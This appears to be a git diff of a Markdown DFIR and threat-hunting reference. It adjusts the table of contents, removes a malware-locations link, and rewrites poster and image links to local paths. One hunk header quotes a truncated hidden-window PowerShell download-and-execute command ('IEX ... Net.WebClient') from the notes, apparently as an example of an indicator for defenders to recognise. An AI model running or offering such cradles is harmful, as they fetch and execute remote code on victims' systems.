@@ -1,5 +1,6 @@
-<!-- no toc --> # Digital Forensics and Incident Response (DFIR), Threat Hunting, and Malware Analysis
+# Digital Forensics and Incident Response (DFIR), Threat Hunting, and Malware Analysis
 
+- [Digital Forensics and Incident Response (DFIR), Threat Hunting, and Malware Analysis](#digital-forensics-and-incident-response-dfir-threat-hunting-and-malware-analysis)
 - [(1) Incident Response](#1-incident-response)
   - [Incident Response Process](#incident-response-process)
   - [Dynamic Approach to Incident Response](#dynamic-approach-to-incident-response)
@@ -8,7 +9,6 @@
   - [Malware Persitence Locations](#malware-persitence-locations)
     - [Common Autostart Locations](#common-autostart-locations)
   - [Common Malware Names](#common-malware-names)
-  - [Common Malware Locations](#common-malware-locations)
   - [Living of the Land Binaries](#living-of-the-land-binaries)
     - [Services](#services)
     - [Scheduled Tasks](#scheduled-tasks)
@@ -414,11 +414,6 @@ SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit
 
 ## Common Malware Names
 * [The typographical and homomorphic abuse of svchost.exe, and other popular file names](https://www.hexacorn.com/blog/2015/12/18/the-typographical-and-homomorphic-abuse-of-svchost-exe-and-other-popular-file-names/)
-
-
-
-## Common Malware Locations
-* [Digging for Malware: Suspicious Filesystem Geography](http://www.malicious-streams.com/resources/articles/DGMW1_Suspicious_FS_Geography.html)
 
 
 
@@ -1892,7 +1887,7 @@ Mandiant stated 24% of malware families they observed were cobalt strike
 
 ## Lateral Movement Tactics
 
-- [Hunt Evil](https://github.com/w00d33/w00d33.github.io/blob/main/_files/SANS_Hunt_Evil_Poster.pdf)
+- [Hunt Evil](./files/SANS_Hunt_Evil_Poster.pdf)
 
 
 ### RDP - Source System Artifacts
@@ -2830,7 +2825,7 @@ powershell -w Hidden -nop -noni -exec bypass IEX (New-ObjectSystem.Net.WebClient
 
 
 
-<img alt="Micosoft's Attack Lifecycle" src="https://raw.githubusercontent.com/w00d33/w00d33.github.io/main/_files/KDGB_flow.PNG" />
+<img src="./files/KDGB_flow.PNG">
 
 
 
